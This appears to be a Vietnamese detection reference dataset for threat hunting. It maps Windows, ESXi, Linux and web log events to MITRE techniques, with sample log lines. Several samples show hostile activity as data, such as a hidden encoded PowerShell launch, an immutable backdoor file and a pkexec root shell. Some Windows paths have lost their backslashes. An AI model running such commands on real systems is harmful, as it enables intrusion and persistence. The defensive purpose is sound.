 "VIB/image profile cài mà không xác minh chữ ký và acceptance level.","timestamp: Thời điểm ghi log VOB (UTC)\n[UserLevelCorrelator]: Thành phần vobd tương quan sự kiện\n[esx.audit.esximage.install.novalidation]: Tên sự kiện audit VOB — cài image/VIB bỏ qua xác minh chữ ký và acceptance level\nmessage: Cảnh báo rủi ro bảo mật cao do cài image profile mà bỏ qua kiểm tra signing và acceptance level", R`2026-10-24T02:40:01.000Z: [UserLevelCorrelator] ...: [esx.audit.esximage.install.novalidation] Attempting to install an image profile bypassing signing and acceptance level verification. This may pose a large security risk.`, "Liên quan các chiến dịch cài VIB độc hại làm backdoor ESXi.", ""],


["esx-ev","esx.audit.ssh.session.opened","Phiên SSH mở","m","T1021.004",
 "","timestamp: Thời điểm ghi log VOB (UTC)\n[UserLevelCorrelator]: Thành phần vobd tương quan sự kiện\n[esx.audit.ssh.session.opened]: Tên sự kiện audit VOB — phiên SSH được mở\n'<user>@<IP>': Tài khoản và địa chỉ IP nguồn của phiên SSH vừa mở", R`2026-10-24T02:31:00.500Z: [UserLevelCorrelator] ...: [esx.audit.ssh.session.opened] SSH session was opened for 'root@10.30.1.99'.`, "", ""],



/* ===== Added entries (accuracy pass + gap-fill) ===== */
["win-sec","4704/4705","Gán / thu hồi user right","h","T1098","4704: một user right (SeDebugPrivilege, SeImpersonatePrivilege, SeLoadDriverPrivilege...) được gán cho tài khoản. 4705: user right bị thu hồi. Ghi trên máy nơi local policy thay đổi, thuộc subcategory Audit Authorization Policy Change.","TargetSid: tài khoản được gán/thu hồi quyền\nPrivilegeList (New Right/User Right): tên quyền, chú ý SeImpersonatePrivilege (tiền đề Juicy Potato/Rogue Potato), SeDebugPrivilege, SeTcbPrivilege, SeLoadDriverPrivilege","EventID=4704 SubjectUserName=adm_x SubjectDomainName=CORP TargetSid=S-1-5-21-...-1105 PrivilegeList=SeImpersonatePrivilege","",""],


["win-sec","4627","Group membership kèm theo logon","m","","Luôn đi kèm 4624, liệt kê toàn bộ SID nhóm mà tài khoản vừa đăng nhập là thành viên, giúp biết ngay phiên logon có thuộc nhóm đặc quyền hay không mà không cần tra cứu thêm. Cần bật Success audit cho cả Audit Group Membership và Audit Logon.","TargetLogonId: khớp TargetLogonId của 4624\nGroupMembership: danh sách SID nhóm, chú ý RID 512/519/544 (Domain Admins/Enterprise Admins/Administrators)","EventID=4627 TargetUserName=adm_thanh TargetDomainName=CORP TargetLogonId=0x5A21F0 LogonType=10 GroupMembership=%{S-1-5-21-...-512} %{S-1-5-32-544}","",""],


["win-sec","4661","Yêu cầu handle tới object AD/SAM","m","T1003.002","Handle được yêu cầu tới object AD hoặc SAM (Security Account Manager), ví dụ khi liệt kê/đọc domain, user, group trong SAM. Cần bật Audit Directory Service Access hoặc Audit SAM, cộng với Success audit cho Audit Handle Manipulation.","ObjectServer=Security Account Manager: SAM bị truy cập\nObjectType=SAM_DOMAIN/SAM_USER/SAM_GROUP/SAM_ALIAS: loại object SAM\nAccessMask: quyền truy cập yêu cầu","EventID=4661 SubjectUserName=svc_backup2 ObjectServer=Security Account Manager ObjectType=SAM_DOMAIN ObjectName=DC=corp,DC=local AccessMask=0x2d ProcessName=C:\\Windows\\System32\\lsass.exe","",""],


["win-sec","4692/4693","Backup / khôi phục DPAPI Master Key","m","T1555","4692: máy backup DPAPI Master Key lên domain controller (cơ chế phục hồi khi đổi mật khẩu). 4693: Master Key được khôi phục từ DC. Xuất hiện bất thường trên nhiều user/máy trong thời gian ngắn là dấu hiệu khai thác domain DPAPI backup key để giải mã secrets hàng loạt (Mimikatz dpapi::masterkey, lsadump::backupkeys).","MasterKeyId: ID master key\nRecoveryServer: domain controller được liên hệ\nStatus Code=0x0 (hoặc 0x380000 cho recovery thành công): kết quả","EventID=4693 SubjectUserName=adm_x MasterKeyId=16cfaea0-dbe3-4d92-9523-d494edb546bc RecoveryServer=DC01.corp.local","",""],


["win-sec","5376/5377","Backup / khôi phục Credential Manager","h","T1555.004","5376: user backup toàn bộ credential trong Credential Manager (Control Panel > Back up Credentials). 5377: khôi phục từ backup. Thao tác này rất hiếm trong dùng bình thường; Microsoft khuyến nghị cảnh báo mọi lần xuất hiện, kết hợp với 5379 để phát hiện đánh cắp credential đã lưu.","SubjectUserName: Tài khoản thực hiện backup/restore\nSubjectDomainName: Domain của tài khoản\nSubjectLogonId: ID phiên đăng nhập thực hiện thao tác","EventID=5376 SubjectUserName=thanhnv SubjectDomainName=CORP SubjectLogonId=0x5A21F0","",""],


["win-sec","4886/4887/4888","Yêu cầu / cấp / từ chối chứng chỉ (AD CS)","h","T1649","Ghi trên server AD Certificate Services (CA). 4886: nhận yêu cầu cấp chứng chỉ; 4887: chứng chỉ được cấp; 4888: yêu cầu bị từ chối. Cần bật 'Issue and Manage Certificate Requests' trong Audit tab của CA cùng subcategory Certification Services. Quan trọng để phát hiện lạm dụng certificate template dễ khai thác (vd. ESC1 và các lỗ hổng AD CS khác).","Requester: tài khoản xin cấp chứng chỉ\nCertificateTemplate: template được dùng, chú ý template cho phép SAN tùy ý hoặc cấp quyền Client Authentication/Domain Controller","EventID=4887 Requester=CORP\\thanhnv CertificateTemplate=VulnerableUserTemplate RequestId=142","",""],


["win-sec","1100","Dịch vụ Event Log dừng hoạt động","h","T1562.002","Windows Event Log service bị tắt/dừng. Xảy ra bình thường khi shutdown hệ thống, nhưng nếu xuất hiện đơn lẻ (không kèm tắt máy) hoặc ngay trước 1102 (xóa log), là dấu hiệu kẻ tấn công cố ngừng ghi log trước khi hành động.","Computer: Máy nơi dịch vụ Event Log bị dừng (không có EventData khác; cần đối chiếu thời điểm với sự kiện shutdown để phân biệt bình thường hay bị tấn công dừng log)","EventID=1100 Provider=Microsoft-Windows-Eventlog Computer=WS-IT-021","",""],


["win-sys","1","Thời gian hệ thống bị thay đổi (Kernel-General)","m","","Đồng hồ hệ thống bị chỉnh, không phải do dịch vụ Windows Time (w32time) đồng bộ bình thường. Ghi lại giờ cũ, giờ mới và tiến trình đã gọi SetSystemTime. Dấu hiệu kinh điển của anti-forensic (lùi/tiến đồng hồ để làm lệch timestamp log trước khi trả lại giờ thật).","OldTime, NewTime, ProcessId (tiến trình thực hiện thay đổi)","EventID=1 Provider=Microsoft-Windows-Kernel-General OldTime=2026-10-24T01:58:00Z NewTime=2026-10-23T20:00:00Z ProcessId=4412","",""],


["win-sys","7000","Service không khởi động được","m","","Service Control Manager không thể khởi động một service. Dòng thứ 2 của message nêu nguyên nhân cụ thể (bị disable, sai thông tin đăng nhập, timeout, thiếu file, hoặc driver bị chặn). Đáng chú ý khi service bảo mật/EDR liên tục không khởi động được.","Service name; mã lỗi/mô tả lỗi kèm theo (ví dụ: access denied, file not found, service disabled)","EventID=7000 Provider=Service Control Manager Message=The Windows Defender Antivirus Service service failed to start due to the following error: This service cannot be started in Safe Mode.","",""],


["win-sys","20001","Cài driver cho thiết bị PnP mới (USB)","i","T1200,T1052.001","Windows vừa cài xong driver cho một thiết bị Plug-and-Play mới cắm vào máy, gồm cả USB lưu trữ và thiết bị giả lập bàn phím/chuột (BadUSB/Rubber Ducky). Status=0 là cài thành công.","Device Instance ID (chứa VID/PID và serial của thiết bị USB), Driver (.inf dùng để cài), Status (0=OK, khác 0=lỗi)","EventID=20001 Provider=Microsoft-Windows-UserPnp DeviceInstanceId=USBVID_0781&PID_5567\u0004C531001234567890123 Driver=disk.inf Status=0","",""],


["win-def","1121/1122","ASR rule chặn / chỉ cảnh báo hành vi","h","","Attack Surface Reduction rule khớp với một hành vi: 1121 = rule ở chế độ Block và đã chặn hành động; 1122 = rule ở chế độ Audit, chỉ ghi nhận chứ không chặn. Các rule ASR nhắm vào hành vi như Office spawn tiến trình con, script đáng ngờ, dump LSASS... Kỹ thuật MITRE cụ thể phụ thuộc vào Rule ID (GUID) bị khớp.","Rule ID (GUID của ASR rule), Process Name, Path, Target file","EventID=1121 RuleId={D4F940AB-401B-4EFC-AADC-AD5F3C50688A} ProcessName=WINWORD.EXE Path=C:UsersPublicpayload.exe Message=Block Office application from creating child processes","",""],


["win-def","1123/1124","Controlled Folder Access chặn / cảnh báo ghi file","c","T1486","Một tiến trình không nằm trong danh sách tin cậy cố ghi/sửa/xóa file trong thư mục được bảo vệ (Documents, Desktop, ...): 1123 = bị chặn (Block mode), 1124 = chỉ ghi nhận (Audit mode). Dấu hiệu mạnh của ransomware đang mã hóa file.","Process Name/Path của tiến trình cố ghi file, đường dẫn file đích bị bảo vệ","EventID=1123 ProcessName=C:UsersPublicenc.exe TargetFile=C:Users\thanhnvDocuments\report.docx Message=Controlled folder access blocked","",""],


["win-ps","403","PowerShell engine dừng (classic log)","i","T1059.001","Cặp sự kiện với 400: engine PowerShell trong tiến trình chuyển từ Available sang Stopped, đánh dấu kết thúc phiên/script. Cùng RunspaceId với event 400 mở phiên tương ứng nên có thể ghép lại để tính thời lượng phiên PowerShell.","RunspaceId (khớp với event 400 mở đầu phiên), HostApplication, EngineVersion","EventID=403 PreviousEngineState=Available NewEngineState=Stopped HostApplication=powershell.exe -nop -w hidden -enc SQBFAFgA... RunspaceId=3f1a2b4c-7e2d-4a11-9c3e-1a2b3c4d5e6f","",""],


["win-sysmon","4","Sysmon: dịch vụ đổi trạng thái","h","T1562.001","Ghi khi dịch vụ Sysmon dừng hoặc khởi động lại; không thể lọc/tắt event này. Sysmon dừng đột ngột ngoài kế hoạch bảo trì là dấu hiệu attacker/EDR-killer vô hiệu hóa telemetry trước khi thao tác.","State=Stopped/Started","EventID=4 State=Stopped SchemaVersion=4.90","",""],


["win-sysmon","9","RawAccessRead (đọc đĩa thô)","h","T1006, T1003.003","Tiến trình đọc trực tiếp ổ đĩa/volume qua đường dẫn kiểu \\\\.\\, bỏ qua API filesystem và các công cụ audit file thông thường. Hiếm gặp trong vận hành bình thường (ngoài backup/forensic tool), thường gắn với đánh cắp ntds.dit hoặc chống điều tra.","Image: tiến trình thực hiện đọc; Device: ổ đĩa/volume mục tiêu (vd. \\Device\\HarddiskVolume2)","EventID=9 Image=C:\\Users\\Public\\raw_dump.exe Device=\\Device\\HarddiskVolume2","",""],


["win-sysmon","16","ServiceConfigurationChange (đổi cấu hình Sysmon)","h","T1562.001","Ghi mỗi khi cấu hình Sysmon (file rule filtering) được cập nhật; không thể tắt. Dùng làm tín hiệu chống giả mạo: mọi thay đổi cấu hình ngoài quy trình triển khai đã biết cần được điều tra. Lưu ý: sửa trực tiếp registry (không qua sysmon -c) có thể không tạo event này.","Configuration, ConfigurationFileHash","EventID=16 Configuration=C:\\ProgramData\\sysmonconfig.xml ConfigurationFileHash=SHA256=1F3A...","",""],


["win-sysmon","24","ClipboardChange (nội dung clipboard mới)","m","T1115","Ghi khi nội dung clipboard hệ thống thay đổi, kèm tiến trình liên quan và file lưu bản sao nội dung. Hữu ích để phát hiện malware đánh cắp dữ liệu qua clipboard hoặc clipper thay địa chỉ ví tiền điện tử.","Image, Session, ClientInfo, Archived (đường dẫn bản lưu nội dung)","EventID=24 Image=C:\\Windows\\System32\\svchost.exe Session=2 Archived=C:\\Sysmon\\20261024\\clip_0001.clp","",""],


["win-rdp","Security 4624/4625 (LogonType 10)","Đăng nhập RDP thành công/thất bại (Security log)","m","T1021.001, T1110","Security log ghi đăng nhập (4624) hoặc đăng nhập thất bại (4625) với LogonType=10 (RemoteInteractive) khi có kết nối RDP. Dùng chung với 1149/21 để dựng chuỗi phiên đầy đủ; 4625 lặp lại nhiều lần từ một nguồn là dấu hiệu brute force RDP.","LogonType=10: qua RDP; IpAddress: nguồn kết nối; TargetUserName/TargetDomainName: tài khoản đăng nhập","EventID=4624 LogonType=10 TargetUserName=adm_thanh TargetDomainName=CORP IpAddress=10.20.5.23 WorkstationName=JUMP01","",""],


["win-rdp","39/40","LocalSessionManager: phiên bị ngắt bởi phiên khác / mã lý do","m","T1563.002","39 ghi khi một phiên bị ngắt bởi một phiên khác (SessionID khác nhau cho thấy có người/admin khác chủ động ngắt, không phải người dùng tự thoát); 40 ghi kèm mã lý do ngắt kết nối. Hữu ích khi điều tra nghi vấn chiếm phiên RDP (RDP session hijacking qua tscon.exe).","Session, (Target) Session ở event 39; Reason code ở event 40","EventID=39 Message=Session 3 has been disconnected by session 0, reason code 0","",""],


["win-task","Security 4698/4699","Scheduled task: tạo/xóa task (Security log, kèm XML đầy đủ)","h","T1053.005","4698 ghi khi một scheduled task mới được đăng ký, kèm toàn bộ nội dung XML định nghĩa (action, trigger, tài khoản chạy) — chi tiết hơn nhiều so với Task Scheduler Operational 106; 4699 ghi khi task bị xóa. Yêu cầu bật Audit Object Access (Other Object Access Events) trên Security log.","TaskName; TaskContent: XML chứa Command/Arguments của action; SubjectUserName: người tạo","EventID=4698 TaskName=\\Microsoft\\Windows\\UpdateOrchestrator\\UpdCheck SubjectUserName=adm_thanh TaskContent=<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-enc SQBFAFgA...</Arguments></Exec></Actions></Task>","",""],


["win-oth","CodeIntegrity 3077","CodeIntegrity: driver/file bị chặn bởi App Control","h","T1068, T1014","Microsoft-Windows-CodeIntegrity/Operational. 3077 ghi khi chính sách App Control (WDAC) hoặc Microsoft Vulnerable Driver Blocklist chặn thực thi driver/DLL/EXE ở chế độ enforcement — đây là nơi thấy nỗ lực nạp driver dễ tổn thương (BYOVD) bị chặn, bổ trợ cho Sysmon 6. Event 3033 liên quan là lỗi xác thực chữ ký.","FileName: đường dẫn file bị chặn; PolicyName/PolicyID","EventID=3077 FileName=\\Device\\HarddiskVolume2\\Windows\\Temp\\RTCore64.sys PolicyName=Microsoft Vulnerable Driver Blocklist Policy","",""],


["win-oth","Security 4611","LSA: đăng ký trusted logon process","h","T1547.005","Ghi khi một tiến trình đăng ký với LSA làm trusted logon process (LsaRegisterLogonProcess), được cấp SeTcbPrivilege. Ngoài winlogon.exe/services.exe lúc khởi động, một đăng ký mới bất thường có thể là dấu hiệu cài Security Support Provider (SSP) giả mạo để chặn bắt mật khẩu dạng cleartext (kiểu mimilib.dll).","ProcessName, LogonProcessName","EventID=4611 ProcessName=C:\\Windows\\System32\\lsass.exe LogonProcessName=evilssp","",""],


["lin-auth","userdel","Xóa tài khoản local","h","T1070","shadow-utils ghi log khi userdel xóa user/nhóm. Đối lập với 'useradd' đã có nhưng đang thiếu hẳn phía xóa — quan trọng cho hành vi dọn dấu vết (xóa tài khoản backdoor sau khi dùng xong).","delete user: tài khoản local vừa bị xóa\nremoved group: nhóm cùng tên bị xóa theo (nếu là nhóm riêng của user)\nowned by: xác nhận nhóm bị xóa thuộc sở hữu của user vừa xóa\nuserdel[pid]: PID tiến trình userdel thực hiện xóa","Oct 24 11:02:10 app01 userdel[22810]: delete user 'sysbackup'\nOct 24 11:02:10 app01 userdel[22810]: removed group 'sysbackup' owned by 'sysbackup'","",""],


["lin-auth","pkexec polkit","Leo quyền qua pkexec/polkit","h","T1548.003, T1068","pkexec (polkit) là đường leo quyền song song với sudo, ghi vào auth.log/journal. Hoàn toàn vắng mặt trong bộ hiện tại dù đây là vector khai thác phổ biến (vd. CVE-2021-4034/PwnKit).","thanhnv (trước dấu hai chấm): tài khoản gọi pkexec để xin leo quyền\nExecuting command: xác nhận polkit đã cấp phép và lệnh chuẩn bị chạy\nUSER: tài khoản đích lệnh sẽ chạy dưới quyền (thường root)\nTTY: terminal gọi lệnh (unknown nếu không có tty, phổ biến khi khai thác CVE-2021-4034)\nCWD: thư mục làm việc khi gọi pkexec\nCOMMAND: đường dẫn đầy đủ lệnh được thực thi","Oct 24 11:05:40 app01 pkexec[22901]: thanhnv: Executing command [USER=root] [TTY=unknown] [CWD=/home/thanhnv] [COMMAND=/usr/bin/bash]","",""],


["lin-auth","AllowUsers/DenyUsers","SSH chặn theo AllowUsers/DenyUsers","m","T1078","sshd từ chối kết nối trước cả bước xác thực nếu user không nằm trong AllowUsers hoặc bị liệt trong DenyUsers — dòng log khác với 'Invalid user' và 'Failed password' đã có, đáng tách riêng vì chỉ ra rule allow/deny đang hoạt động hoặc bị dò.","User <user>: tài khoản bị từ chối trước khi xác thực\nfrom: địa chỉ IP nguồn thực hiện kết nối\nnot allowed because not listed in AllowUsers: lý do từ chối — user không nằm trong danh sách AllowUsers (hoặc bị liệt trong DenyUsers) cấu hình trong sshd_config","Oct 24 09:12:29 app01 sshd[21544]: User oracle from 10.30.1.99 not allowed because not listed in AllowUsers","",""],


["lin-sys","systemd timer","Persistence qua systemd timer","h","T1053.006","Thay vì cron, kẻ tấn công dùng cặp .timer/.service của systemd để duy trì chỗ đứng định kỳ — kỹ thuật ngày càng phổ biến vì ít được soi bằng các rule 'theo dõi crontab' truyền thống. Bộ hiện tại chỉ có 'systemd Started' cho service đơn lẻ, thiếu hẳn góc nhìn timer.","Started <name>.timer: timer unit được kích hoạt theo lịch cấu hình (OnCalendar/OnBootSec...)\nStarting <name>.service...: service liên kết với timer bắt đầu khởi chạy\nStarted <name>.service.: service đã khởi động xong, đây là nơi payload thực sự thực thi\nsystemd[1]: tiến trình systemd (PID 1) ghi nhận các chuyển trạng thái unit","Oct 24 02:00:00 app01 systemd[1]: Started cleanup.timer.\nOct 24 02:00:00 app01 systemd[1]: Starting cleanup.service...\nOct 24 02:00:01 app01 systemd[1]: Started cleanup.service.","",""],


["lin-sys","audit backlog dropped","Kernel bỏ sự kiện audit do quá tải (vùng mù log)","h","T1562.012","Khi backlog của audit đầy, kernel bỏ bớt sự kiện thay vì ghi — kẻ tấn công có thể cố ý tạo lượng lớn syscall để làm audit 'mù' tạm thời. Đây là góc defense-evasion hoàn toàn thiếu trong bộ hiện tại (các entry auditd chỉ nói về dừng/sửa rule, không nói về mất event do quá tải).","audit: nhãn nguồn log (phân hệ audit trong kernel)\naudit_lost: số sự kiện audit đã bị kernel loại bỏ do hàng đợi quá tải\naudit_rate_limit: giới hạn số event/giây cho phép ghi (0 = không giới hạn tốc độ)\naudit_backlog_limit: kích thước tối đa hàng đợi backlog trước khi bắt đầu rớt sự kiện","Oct 24 03:15:02 app01 kernel: audit: audit_lost=438 audit_rate_limit=0 audit_backlog_limit=320","",""],


["lin-acct","wtmp/btmp bị xóa/rỗng","wtmp/btmp bị xóa hoặc làm rỗng (chống điều tra)","c","T1070.002","Kẻ tấn công thường ghi đè hoặc xóa /var/log/wtmp, /var/log/btmp để xóa dấu vết đăng nhập. Dấu hiệu: lệnh last/lastb trả về rất ít dòng hoặc dòng 'wtmp begins' có mốc thời gian bất thường gần đây so với tuổi hệ thống. Bộ hiện tại có 3 entry đọc các file này nhưng không có entry nào về việc chính các file đó bị can thiệp.","last/lastb output: kết quả lệnh last/lastb đọc từ wtmp/btmp, bất thường nếu quá ít dòng so với thời gian hệ thống đã chạy\nwtmp begins <timestamp>: mốc thời gian file wtmp bắt đầu ghi nhận — nếu mốc này rất gần hiện tại so với uptime hệ thống, khả năng cao file đã bị xóa/ghi đè\n(trống/rỗng): file wtmp/btmp có kích thước 0 hoặc bất thường nhỏ cũng là dấu hiệu bị can thiệp","root     pts/0        10.30.1.99       Sat Oct 24 09:12:44 2026 - Sat Oct 24 10:02:11 2026  (00:49)\n\nwtmp begins Sat Oct 24 09:00:01 2026","",""],


["lin-audit","setuid/setgid chmod","Gắn bit setuid/setgid lên file (chmod/chown)","h","T1548.001","Rule chuẩn CIS: -a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F auid>=1000 -F auid!=4294967295 -k perm_mod (tương tự cho chown/fchown/fchownat/lchown). Hoàn toàn thiếu trong bộ hiện tại dù đây là một trong các rule auditd kinh điển nhất, dùng phát hiện gắn setuid root lên binary để leo quyền/duy trì chỗ đứng.","a1: giá trị mode dạng hex (vd. 9ed = octal 4755, có bit setuid 4000)","type=SYSCALL msg=audit(1729737000.200:4900): arch=c000003e syscall=90 success=yes exit=0 a0=55a1b2 a1=9ed auid=1001 uid=0 euid=0 comm=\"chmod\" exe=\"/usr/bin/chmod\" key=\"perm_mod\"","",""],


["lin-audit","setcap capability","Gán Linux capability lên binary (setcap)","h","T1548.001","Rule cộng đồng (Neo23x0/Florian Roth): -a always,exit -F arch=b64 -S setxattr,lsetxattr,fsetxattr -k capability_change. setcap gán capability (vd. cap_setuid+ep) lên một binary thường (python3, perl...) là kỹ thuật leo quyền thay thế setuid, nằm trong danh sách GTFOBins nhưng chưa có entry nào theo dõi.","syscall: syscall gán extended attribute (setxattr/lsetxattr/fsetxattr) dùng để set capability\ncomm: tên tiến trình thực hiện (setcap)\nexe: binary thực thi (/usr/sbin/setcap)\nkey: nhãn rule audit (capability_change)\nauid / uid: UID đăng nhập gốc và UID hiệu lực thực hiện thao tác\nsuccess: kết quả syscall (yes/no)","type=SYSCALL msg=audit(1729737050.250:4920): arch=c000003e syscall=188 success=yes exit=0 auid=1001 uid=0 comm=\"setcap\" exe=\"/usr/sbin/setcap\" key=\"capability_change\"","",""],


["lin-audit","watch authorized_keys","Ghi vào authorized_keys (persistence qua SSH key)","c","T1098.004","Rule cộng đồng: -w /root/.ssh -p wa -k rootkey (nên mở rộng theo dõi cho các home thư mục nhạy cảm khác). Entry 'watch /etc/passwd' hiện tại chỉ nhắc rule này trong phần desc như một ví dụ phụ, chưa có entry riêng với sample/hunt — trong khi ghi authorized_keys là một trong các kỹ thuật duy trì truy cập phổ biến nhất.","key: nhãn rule audit (rootkey) đánh dấu nhóm rule giám sát SSH key\ncomm / exe: tiến trình thực hiện ghi file (vim)\nauid / uid: UID đăng nhập gốc và UID hiệu lực ghi file\nname (PATH record): đường dẫn file bị ghi — authorized_keys, xác nhận đúng mục tiêu bị sửa\nsyscall: syscall mở/ghi file (openat, số 257)","type=SYSCALL msg=audit(1729737100.300:4950): arch=c000003e syscall=257 success=yes exit=3 auid=1001 uid=1001 comm=\"vim\" exe=\"/usr/bin/vim\" key=\"rootkey\"\ntype=PATH msg=audit(1729737100.300:4950): item=1 name=\"/home/thanhnv/.ssh/authorized_keys\" nametype=NORMAL","",""],


["lin-audit","ld.so.preload watch","Sửa /etc/ld.so.preload (LD_PRELOAD persistence)","c","T1574.006","Rule cộng đồng: -w /etc/ld.so.preload -p wa -k systemwide_preloads. Ghi thư viện .so độc hại vào /etc/ld.so.preload khiến nó được nạp vào mọi tiến trình khởi chạy — kỹ thuật rootkit kinh điển (Jynx2, Azazel, Diamorphine dùng kèm). Không có entry nào trong bộ hiện tại theo dõi file này.","key: nhãn rule audit (systemwide_preloads)\ncomm / exe: tiến trình thực hiện ghi file (bash)\nauid / uid: UID đăng nhập gốc và UID hiệu lực thực hiện ghi\nname (PATH record): đường dẫn file bị ghi — /etc/ld.so.preload, file được nạp vào mọi tiến trình\nsyscall: syscall mở/ghi file (openat, số 257)","type=SYSCALL msg=audit(1729737200.400:5000): arch=c000003e syscall=257 success=yes exit=3 auid=0 uid=0 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"systemwide_preloads\"\ntype=PATH msg=audit(1729737200.400:5000): item=1 name=\"/etc/ld.so.preload\" nametype=NORMAL","",""],


["lin-audit","chattr +i","Đặt thuộc tính immutable bằng chattr","h","T1222.002","chattr +i trên file/backdoor khiến root cũng không xóa/sửa được cho đến khi gỡ cờ — kỹ thuật bảo vệ payload khỏi bị dọn dẹp, bắt được qua rule exec sẵn có (key=exec, entry 'SYSCALL execve') bằng comm=\"chattr\" nhưng chưa có entry/hunt note riêng để soi.","comm: tên tiến trình thực thi (chattr)\nkey: nhãn rule audit bắt được lệnh (exec, từ rule theo dõi execve)\nargc: số lượng tham số dòng lệnh được ghi lại trong EXECVE\na0/a1/a2: các tham số dòng lệnh theo thứ tự — a0 là tên lệnh (chattr), a1 là cờ (+i), a2 là file/mục tiêu bị gắn immutable","type=SYSCALL msg=audit(1729737300.500:5050): arch=c000003e syscall=59 success=yes exit=0 auid=1001 uid=0 comm=\"chattr\" exe=\"/usr/bin/chattr\" key=\"exec\"\ntype=EXECVE msg=audit(1729737300.500:5050): argc=3 a0=\"chattr\" a1=\"+i\" a2=\"/usr/bin/.hidden_backdoor\"","",""],


["lin-audit","time-change","Thay đổi giờ hệ thống (timestomp hạ tầng)","m","","Rule chuẩn CIS/STIG: -a always,exit -F arch=b64 -S adjtimex,settimeofday,clock_settime -k time-change; -w /etc/localtime -p wa -k time-change. Đổi giờ hệ thống là thủ thuật chống điều tra kinh điển (làm lệch timeline log) nhưng nhóm auditd hiện tại không có entry nào cho hạng mục chuẩn này.","syscall: syscall chỉnh giờ hệ thống (adjtimex/settimeofday/clock_settime)\ncomm: tên tiến trình gọi thay đổi giờ (date)\nexe: binary thực thi tương ứng (/usr/bin/date)\nkey: nhãn rule audit (time-change)\nauid / uid: UID đăng nhập gốc và UID hiệu lực thực hiện thay đổi\nsuccess: kết quả syscall (yes/no)","type=SYSCALL msg=audit(1729737400.600:5100): arch=c000003e syscall=227 success=yes exit=0 auid=0 uid=0 comm=\"date\" exe=\"/usr/bin/date\" key=\"time-change\"","",""],


["web-acc","xff-spoofing","Giả mạo X-Forwarded-For / X-Real-IP","i","","Khi server đứng sau LB/reverse proxy/CDN, IP trong $remote_addr (%h) là IP của proxy chứ không phải client thật; ứng dụng phải đọc X-Forwarded-For hoặc X-Real-IP. Đây là header do client tự đặt nên có thể bị giả mạo nếu proxy không cấu hình chỉ tin các proxy đã biết (vd. nginx realip_module + set_real_ip_from).","X-Forwarded-For: danh sách IP client,proxy1,proxy2,...; nếu không cấu hình trust proxy đúng, kẻ tấn công có thể tự chèn giá trị giả để né rate-limit/IP block hoặc đổ lỗi oan cho IP khác.\nX-Real-IP: tương tự, thường do một proxy duy nhất gán.","203.0.113.50 - - [24/Oct/2026:10:00:00 +0700] \"GET /api/data HTTP/1.1\" 200 512 \"-\" \"curl/8.4.0\" (X-Forwarded-For: 1.2.3.4, 203.0.113.50)","",""],


["web-acc","log-clearing","Access log bị xóa/cắt ngắn (anti-forensics)","h","T1070.002","Kẻ tấn công có thể xóa, truncate (cắt về 0 byte), hoặc tạm dừng ghi access log sau khi khai thác để xóa dấu vết. Dấu hiệu: khoảng trống thời gian bất thường giữa các dòng log, kích thước/mtime file log thay đổi không khớp chu kỳ logrotate, log đột ngột ngắn hơn log của LB/WAF phía trước cùng khung giờ.","So khớp số dòng/khung giờ giữa access log gốc và log LB/WAF/CDN phía trước để phát hiện đoạn bị xóa.","# access.log dừng đột ngột lúc 09:12:44, dòng kế tiếp xuất hiện lúc 14:30:02 dù log LB phía trước vẫn ghi nhận traffic liên tục trong khoảng đó","",""],


["web-iis","bytes-fields","Trường sc-bytes / cs-bytes (W3C)","i","","sc-bytes (số byte server gửi về client) và cs-bytes (số byte server nhận từ client) là 2 trường chuẩn trong W3C Extended Log File Format, hiện chưa được liệt kê. Hữu ích để phát hiện rò rỉ dữ liệu (sc-bytes tăng đột biến) hoặc upload file lớn bất thường/webshell (cs-bytes tăng đột biến).","sc-bytes: bytes server gửi cho client (phản hồi) — tăng bất thường gợi ý dump dữ liệu.\ncs-bytes: bytes server nhận từ client (request) — tăng bất thường gợi ý upload file lớn.","2026-10-24 02:40:00 10.10.1.20 GET /export/report.csv - 443 - 203.0.113.7 python-requests/2.31.0 - 200 0 0 820 5242880 312","",""],


["web-iis","webdav-propfind","Khai thác WebDAV qua PROPFIND/PUT/MOVE","c","T1190","IIS bật WebDAV chấp nhận các method PROPFIND, PUT, MOVE, DELETE ngoài GET/POST thông thường. CVE-2017-7269 (IIS 6.0, hàm ScStoragePathFromUrl) khai thác buffer overflow qua header 'If:' dài bất thường trong request PROPFIND để RCE; PUT/MOVE cũng có thể bị lạm dụng để upload webshell khi thư mục WebDAV cấu hình sai quyền ghi.","cs-method = PROPFIND/PUT/MOVE/DELETE là bất thường với phần lớn ứng dụng web; độ dài header bất thường (If:, Destination:) là dấu hiệu khai thác.","2026-10-24 02:50:00 10.10.1.20 PROPFIND / - 80 - 203.0.113.7 - - 500 0 0 12","",""],


["web-atk","credential-stuffing","Credential stuffing (dùng cặp user/pass rò rỉ)","h","T1110.004","Khác với brute force dò nhiều mật khẩu trên một tài khoản (đã có ở mục Login brute force), credential stuffing dùng danh sách cặp username/password rò rỉ từ vụ lộ dữ liệu khác, mỗi tài khoản thường chỉ thử 1 lần để tránh khóa tài khoản (account lockout); traffic thường đến từ nhiều IP/proxy xoay vòng thay vì một IP lặp lại.","%h: nhiều IP khác nhau cho cùng một endpoint (10.40.2.1, 10.40.2.5, ...) - khác brute force cổ điển (1 IP dò nhiều mật khẩu trên 1 tài khoản)\n\"%r\": \"POST /login\" lặp lại nhưng mỗi IP/yêu cầu thường chỉ thử 1 lần (dùng cặp user/pass rò rỉ có sẵn)\n%>s: 401 lặp lại - hầu hết cặp thông tin không hợp lệ\nUser-Agent: giống nhau qua nhiều IP (python-requests/2.31.0) - dấu hiệu cùng một công cụ/script chạy qua nhiều proxy hoặc IP xoay vòng","10.40.2.1 - - [24/Oct/2026:11:00:01 +0700] \"POST /login HTTP/1.1\" 401 52 \"-\" \"python-requests/2.31.0\"\n10.40.2.5 - - [24/Oct/2026:11:00:03 +0700] \"POST /login HTTP/1.1\" 401 52 \"-\" \"python-requests/2.31.0\"","",""],


